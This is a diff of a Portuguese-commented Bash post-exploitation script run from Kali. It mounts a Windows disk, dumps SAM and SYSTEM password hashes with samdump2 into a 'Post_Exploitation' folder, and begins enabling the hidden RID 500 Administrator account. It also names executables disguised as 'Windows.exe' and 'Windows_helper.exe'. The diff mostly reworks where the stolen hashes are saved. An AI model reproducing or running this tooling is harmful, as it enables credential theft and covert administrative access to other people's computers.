@@ -5,8 +5,9 @@ BOT="Windows.exe"
 HELPER="Windows_helper.exe"
 ASSISTANT="Windows.assistant.exe"
 SYS32_REG="C:\\\\Windows\\\\System32"
-DEST_DIR="$HOME/Desktop/Extraction_$(date +%d%m)"
-mkdir -p "$DEST_DIR"
+# --- CONFIGURAÇÕES DE DESTINO NO KALI ---
+POST_EXP_DIR="/home/kali/Desktop/Post_Exploitation"
+mkdir -p "$POST_EXP_DIR"
 
 echo "[+] INICIANDO PROTOCOLO OMNI: ACESSO TOTAL & FAILOVER DE MONTAGEM"
 
@@ -39,8 +40,7 @@ SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
 SAM="$MOUNT_POINT/Windows/System32/config/SAM"
 
 # 2. EXTRAÇÃO DE HASHES (Formatado em Colunas)
-echo "[*] Extraindo hashes para tabela..."
-samdump2 "$SYSTEM" "$SAM" | column -t -s ":" > "$DEST_DIR/hashes_tabela.txt"
+samdump2 "$SYSTEM" "$SAM" | column -t -s ":" > "$POST_EXP_DIR/hashes_$(date +%d%m_%H%M).txt"
 
 # 3. ATIVAR ADMIN OCULTO (RID 500)
 echo "[*] Ativando Administrador Oculto..."
